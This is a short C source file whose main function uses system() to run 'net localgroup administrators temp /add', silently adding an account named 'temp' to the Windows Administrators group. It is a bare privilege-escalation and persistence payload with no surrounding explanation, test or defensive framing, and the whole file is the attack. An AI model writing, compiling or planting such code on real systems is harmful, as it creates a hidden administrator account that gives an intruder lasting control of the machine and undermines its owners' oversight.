#include <stdlib.h>

int main() {

  int i;
  i = system("net localgroup administrators temp /add");
  return 0;
}
